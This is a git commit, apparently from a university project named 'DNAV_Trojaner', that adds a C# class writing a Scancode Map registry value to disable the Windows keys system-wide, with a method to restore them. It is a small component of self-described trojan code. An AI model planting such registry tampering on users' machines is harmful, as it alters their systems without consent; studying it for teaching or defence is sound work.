03e6bcf5e704fc685bddf5509a0696fb2f4a6a32
Simon, Judith <Judith.Simon@hsrw.org>
2019-11-11 15:06:55 +0100

    Windows Taste aktivieren/deaktivieren

---
+++ DNAV_Trojaner/WindowsKey.cs
@@ -0,0 +1,56 @@
+﻿using Microsoft.Win32;
+
+namespace DNAV_Trojaner
+{
+    class WindowsKey
+    {
+        public static void Disable()
+        {
+            RegistryKey key;
+
+            key = Registry.LocalMachine.OpenSubKey(@"System\CurrentControlSet\Control\Keyboard Layout", true);
+            byte[] binary = new byte[] {
+                    0x00,
+                    0x00,
+                    0x00,
+                    0x00,
+                    0x00,
+                    0x00,
+                    0x00,
+                    0x00,
+                    0x03,
+                    0x00,
+                    0x00,
+                    0x00,
+                    0x00,
+                    0x00,
+                    0x5B,
+                    0xE0,
+                    0x00,
+                    0x00,
+                    0x5C,
+                    0xE0,
+                    0x00,
+                    0x00,
+                    0x00,
+                    0x00
+                };
+            key.SetValue("Scancode Map", binary, RegistryValueKind.Binary);
+
+            key.Close();
+
+        }
+
+        
+        public static void Enable()
+        {
+            RegistryKey key;
+
+            key = Registry.LocalMachine.OpenSubKey(@"System\CurrentControlSet\Control\Keyboard Layout", true);
+            key.DeleteValue("Scancode Map", true);
+
+            key.Close();
+
+        }
+    }
+}
